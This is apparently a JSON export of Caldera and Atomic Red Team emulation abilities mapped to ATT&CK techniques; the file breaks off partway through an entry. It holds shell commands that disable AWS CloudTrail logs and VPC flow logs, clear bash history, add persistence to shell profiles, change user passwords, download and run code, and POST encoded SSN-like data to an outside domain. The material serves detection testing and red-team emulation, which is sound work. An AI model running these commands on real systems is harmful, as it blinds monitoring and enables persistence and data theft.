[
    {
        "description": "Pause all operations to avoid making noise",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Virtualization/Sandbox Evasion: Time Based Evasion",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "sleep 60",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "1-min sleep",
        "tactic": "defense-evasion",
        "plugin": "stockpile",
        "ability_id": "36eecb80-ede3-442b-8774-956e906aff02",
        "technique_id": "T1497.003",
        "repeatable": false
    },
    {
        "description": "This Atomic test will use the Stratus Red Team will first setup a CloudTrail logging into an S3 bucket and will then make an API call to update the lifecycle rule on that S3 bucket with an expiration date of 1 day. This will essentially delete all the logs after one day. Adversaries often do this actiivity to evade detection. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable Cloud Logs",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1562.008/src; echo \"starting warmup\"; ./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule; echo \"starting detonate\"; ./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "export AWS_REGION=us-west-2; echo \"Cleanup detonation\"; cd $PathToAtomicsFolder/T1562.008/src; ./stratus cleanup --all; rm -rf stratus*"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "AWS - CloudTrail Logs Impairment Through S3 Lifecycle Rule using Stratus",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "f05e54049cfa10bc4018bf9e68676cc8",
        "technique_id": "T1562.008",
        "repeatable": false
    },
    {
        "description": "Update event selectors in AWS CloudTrail to disable the logging of certain management events to evade defense. This Atomic test leverages a tool called Stratus-Red-Team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable Cloud Logs",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1562.008/src; echo \"starting warmup\"; ./stratus warmup aws.defense-evasion.cloudtrail-event-selectors; echo \"starting detonate\"; ./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "export AWS_REGION=us-west-2; echo \"Cleanup detonation\"; cd $PathToAtomicsFolder/T1562.008/src; ./stratus cleanup --all; rm -rf stratus*"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "AWS - Disable CloudTrail Logging Through Event Selectors using Stratus",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "647e4465558374490275ec1e6892902a",
        "technique_id": "T1562.008",
        "repeatable": false
    },
    {
        "description": "This atomic runs several API calls (sts:GetCallerIdentity, s3:ListBuckets, iam:GetAccountSummary, iam:ListRoles, iam:ListUsers, iam:GetAccountAuthorizationDetails, ec2:DescribeSnapshots, cloudtrail:DescribeTrails, guardduty:ListDetectors) from the context of an EC2 instance role. This simulates an attacker compromising an EC2 instance and running initial discovery commands on it. This atomic test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.discovery.ec2-enumerate-from-instance/\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Cloud Infrastructure Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "if test -f \"$PathToAtomicsFolder/T1580/src/stratus\"; then : ; else if [ \"$(uname)\" = \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1580/src/; elif [ \"$(expr substr $(uname) 1 5)\" = \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep -i linux_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1580/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1580/src/; fi; fi;  ;  export AWS_REGION=us-west-2; cd $PathToAtomicsFolder/T1580/src; echo \"Stratus: Start Warmup.\"; ./stratus warmup aws.discovery.ec2-enumerate-from-instance; echo \"Stratus: Start Detonate.\"; ./stratus detonate aws.discovery.ec2-enumerate-from-instance",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "cd $PathToAtomicsFolder/T1580/src; echo \"Stratus: Start Cleanup.\"; ./stratus cleanup aws.discovery.ec2-enumerate-from-instance; echo \"Removing Stratus artifacts from local machine.\"; rm -rf stratus*"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "AWS - EC2 Enumeration from Cloud Instance",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "e1f9618acc7e0232967e78b6274251da",
        "technique_id": "T1580",
        "repeatable": false
    },
    {
        "description": "This Atomic will attempt to remove AWS VPC Flow Logs configuration. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable Cloud Logs",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "if [ -f $PathToAtomicsFolder/T1562.008/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1562.008/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1562.008/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1562.008/src; echo \"starting warmup\"; ./stratus warmup aws.defense-evasion.vpc-remove-flow-logs; echo \"starting detonate\"; ./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "export AWS_REGION=us-west-2; echo \"Cleanup detonation\"; cd $PathToAtomicsFolder/T1562.008/src; ./stratus cleanup --all; rm -rf stratus*"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "AWS - Remove VPC Flow Logs using Stratus",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "a26601ea01296a3a01c3854340d1c396",
        "technique_id": "T1562.008",
        "repeatable": false
    },
    {
        "description": "This atomic runs an API call GetPasswordData from a role that does not have permission to do so. This simulates an attacker attempting to retrieve RDP passwords on a high number of Windows EC2 instances. This atomic test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.credential-access.ec2-get-password-data/\n",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "if [ -f $PathToAtomicsFolder/T1552/src/stratus ]; then : ; else if [ \"$(uname)\" == \"Darwin\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O $PathToAtomicsFolder/T1552/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1552/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1552/src/; elif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]; then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) ;   wget -q -O $PathToAtomicsFolder/T1552/src/stratus-red-team-latest.tar.gz $DOWNLOAD_URL;   tar -xzvf $PathToAtomicsFolder/T1552/src/stratus-red-team-latest.tar.gz --directory $PathToAtomicsFolder/T1552/src/; fi; fi;  ;  export AWS_REGION=us-west-2 ; cd $PathToAtomicsFolder/T1552/src; echo \"starting warmup\"; ./stratus warmup aws.credential-access.ec2-get-password-data; echo \"starting detonate\"; ./stratus detonate aws.credential-access.ec2-get-password-data --force",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "export AWS_REGION=us-west-2; echo \"Cleanup detonation\"; cd $PathToAtomicsFolder/T1552/src; ./stratus cleanup --all; rm -rf stratus*"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "AWS - Retrieve EC2 Password Data using stratus",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "33f718d05dddc362f6f83802b8b89e93",
        "technique_id": "T1552",
        "repeatable": false
    },
    {
        "description": "After execution the current/new user will be added to the Admin group",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Valid Accounts: Local Accounts",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Add a new/existing user to the admin group using dseditgroup utility - macOS",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "7cdbf13211f9012f4192405636a97e20",
        "technique_id": "T1078.003",
        "repeatable": false
    },
    {
        "description": "Add a malicous bookmark which looks like a current one",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: AppleScript",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Add bookmark",
        "tactic": "execution",
        "plugin": "stockpile",
        "ability_id": "de52784d-4de6-4d4e-b79e-e7b68fe037fb",
        "technique_id": "T1059.002",
        "repeatable": false
    },
    {
        "description": "Adds a command to the .bash_profile file of the current user\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: .bash_profile and .bashrc",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "echo 'echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004' >> ~/.bash_profile",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "head -n '-2' ~/.bash_profile > /tmp/T1546.004; mv /tmp/T1546.004 ~/.bash_profile"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Add command to .bash_profile",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "f46fcebae29a2bde63127a3bcee47d23",
        "technique_id": "T1546.004",
        "repeatable": false
    },
    {
        "description": "Adds a command to the .bashrc file of the current user\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Event Triggered Execution: .bash_profile and .bashrc",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "echo 'echo \"Hello from Atomic Red Team T1546.004\" > /tmp/T1546.004' >> ~/.bashrc",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [
                    "head -n '-2' ~/.bashrc > /tmp/T1546.004; mv /tmp/T1546.004 ~/.bashrc"
                ],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Add command to .bashrc",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "78c03eac53060523b4eef3ad473d218c",
        "technique_id": "T1546.004",
        "repeatable": false
    },
    {
        "description": "Modify or create an file in /Library/StartupItems\n\n[Reference](https://www.alienvault.com/blogs/labs-research/diversity-in-recent-mac-malware)\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Initialization Scripts: Startup Items",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Add file to Local Library StartupItems",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "61fddd16aa5019ccc7e5440fc1be4dfc",
        "technique_id": "T1037.005",
        "repeatable": false
    },
    {
        "description": "Runs osascript on a file to create new LoginItem for current user.\nNOTE: Will popup dialog prompting user to Allow or Deny Terminal.app to control \"System Events\"\nTherefore, it can't be automated until the TCC is granted.\nThe login item launches Safari.app when user logs in, but there is a cleanup script to remove it as well.\nIn addition to the `osascript` Process Events, file modification events to\n`/Users/*/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm` should be seen.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Login Items",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Add macOS LoginItem using Applescript",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "244cd00410232659c0098f9ad4b9da2a",
        "technique_id": "T1547.015",
        "repeatable": false
    },
    {
        "description": "Appends an entry to launch Calculator hidden loginwindow.*.plist for next login.\nNote that the change may not result in the added Calculator program launching on next user login.\nIt may depend on which version of macOS you are running on.\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Boot or Logon Autostart Execution: Re-opened Applications",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Append to existing loginwindow for Re-Opened Applications",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "7a5720249df1912017c99a2df7f3d1a8",
        "technique_id": "T1547.007",
        "repeatable": false
    },
    {
        "description": "Shell Script with AppleScript. The encoded python script will perform an HTTP GET request to 127.0.0.1:80 with a session cookie of \"t3VhVOs/DyCcDTFzIKanRxkvk3I=\", unless 'Little Snitch' is installed, in which case it will just exit. \nYou can use netcat to listen for the connection and verify execution, e.g. use \"nc -l 80\" in another terminal window before executing this test and watch for the request.\n\nReference: https://github.com/EmpireProject/Empire\n",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Command and Scripting Interpreter: AppleScript",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "AppleScript",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "0ed5491929cf9b5d9cf848dfeea869eb",
        "technique_id": "T1059.002",
        "repeatable": false
    },
    {
        "description": "Prompt User for Password (Local Phishing)\nReference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html\n",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Input Capture: GUI Input Capture",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "AppleScript - Prompt User for Password",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "e3d4f78fc9dac33343b2f0865a8f8d45",
        "technique_id": "T1056.002",
        "repeatable": false
    },
    {
        "description": "Stop terminal from logging history",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Clear Command History",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "> $HOME/.bash_history && unset HISTFILE",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Avoid logs",
        "tactic": "defense-evasion",
        "plugin": "stockpile",
        "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
        "technique_id": "T1070.003",
        "repeatable": false
    },
    {
        "description": "Utilizing a common technique for posting base64 encoded data.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Data Encoding: Standard Encoding",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "echo -n 111-11-1111 | base64; curl -XPOST MTExLTExLTExMTE=.redcanary.com",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Base64 Encoded data.",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "d5c3d4d3a33600ba963db53932e355f7",
        "technique_id": "T1132.001",
        "repeatable": false
    },
    {
        "description": "Use Perl to decode a base64-encoded text string and echo it to the console\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Deobfuscate/Decode Files or Information",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "ENCODED=$(perl -e \"use MIME::Base64;print(encode_base64('Hello from Atomic Red Team test T1140!'));\"); perl -le \"use MIME::Base64;print(decode_base64('$ENCODED'));\"; echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'; echo $ENCODED > /tmp/T1140.encoded && perl -le 'use MIME::Base64;open($f,\"<\",\"/tmp/T1140.encoded\");print(decode_base64(<$f>));'",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Base64 decoding with Perl",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "b6382bbeb9bd52e48ca7249d30507c9a",
        "technique_id": "T1140",
        "repeatable": false
    },
    {
        "description": "Use Python to decode a base64-encoded text string and echo it to the console\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Deobfuscate/Decode Files or Information",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(\"Hello from Atomic Red Team test T1140!\".encode());print(enc.decode())'); python3 -c \"import base64;dec=base64.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"; python3 -c \"import base64 as d;dec=d.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"; python3 -c \"from base64 import b64decode;dec=b64decode(\\\"$ENCODED\\\");print(dec.decode())\"; python3 -c \"from base64 import b64decode as d;dec=d(\\\"$ENCODED\\\");print(dec.decode())\"; echo $ENCODED | python3 -c \"import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())\"; echo $ENCODED > /tmp/T1140.encoded && python3 -c \"import base64;dec=base64.b64decode(open('/tmp/T1140.encoded').read());print(dec.decode())\"",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Base64 decoding with Python",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "58ef43e598c111afc81ba9a22c6af108",
        "technique_id": "T1140",
        "repeatable": false
    },
    {
        "description": "Use common shell utilities to decode a base64-encoded text string and echo it to the console\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Deobfuscate/Decode Files or Information",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | base64); printf $ENCODED | base64 -d; echo $ENCODED | base64 -d; echo $(echo $ENCODED) | base64 -d; echo $ENCODED > /tmp/T1140.encoded && base64 -d /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && base64 -d < /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | base64 -d; echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | base64 -d; bash -c \"{echo,\\\"$(echo $ENCODED)\\\"}|{base64,-d}\"",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Base64 decoding with shell utilities",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "326a9797b0d59b8f6d5a3c384c564b9f",
        "technique_id": "T1140",
        "repeatable": false
    },
    {
        "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\n\nThe UPX magic number (`0x55505821`, \"`UPX!`\") was changed to (`0x4c4f5452`, \"`LOTR`\"). This prevents the binary from being detected\nby some methods, and especially UPX is not able to uncompress it any more.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Obfuscated Files or Information: Software Packing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Binary packed by UPX, with modified headers",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "2f5cf8c3e8a3a3e6e5621e8f77c5bf65",
        "technique_id": "T1027.002",
        "repeatable": false
    },
    {
        "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\nNo other protection/compression were applied.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Obfuscated Files or Information: Software Packing",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Binary simply packed by UPX",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "eefa25ef5e2f94020b95d80e31ef2bc9",
        "technique_id": "T1027.002",
        "repeatable": false
    },
    {
        "description": "Compile a c file with either gcc or clang on Linux or Macos.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Obfuscated Files or Information: Compile After Delivery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "e9248b_T1027-004-test.c"
                ],
                "command": "if [ -e  e9248b_T1027-004-test.c ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.c -O e9248b_T1027-004-test.c; fi;  ;  gcc e9248b_T1027-004-test.c && ./a.out; clang e9248b_T1027-004-test.c && ./a.out",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "C compile",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "ec7c28b75e9af98aecb33ce5ae14e8c2",
        "technique_id": "T1027.004",
        "repeatable": false
    },
    {
        "description": "Compile a c file with either gcc or clang on Linux or Macos.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Obfuscated Files or Information: Compile After Delivery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [
                    "d7822f_T1027-004-test.cc"
                ],
                "command": "if [ -e  d7822f_T1027-004-test.cc ]; then : ; else wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.cc -O d7822f_T1027-004-test.cc; fi;  ;  g++ d7822f_T1027-004-test.cc && ./a.out; clang++ d7822f_T1027-004-test.cc && ./a.out",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "CC compile",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "37ec8aa96775f561e02a954dae1b56bc",
        "technique_id": "T1027.004",
        "repeatable": false
    },
    {
        "description": "This test changes the user password to hinder access to the account using passwd utility.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Access Removal",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "passwd ARTUser",
                "platform": "linux",
                "parsers": [],
                "build_target": null,
                "cleanup": [],
                "language": null,
                "code": null,
                "name": "sh",
                "timeout": 60
            }
        ],
        "delete_payload": true,
        "access": {},
        "name": "Change User Password via passwd",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "0e5730f670555b9dba829f3d90cbd445",
        "technique_id": "T1531",
        "repeatable": false
    },
    {
        "description": "Check to see if Gooogle Chrome browser is installed",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [
            {
                "uploads": [],
                "additional_info": {},
                "variations": [],
                "payloads": [],
                "command": "which google-chrome",
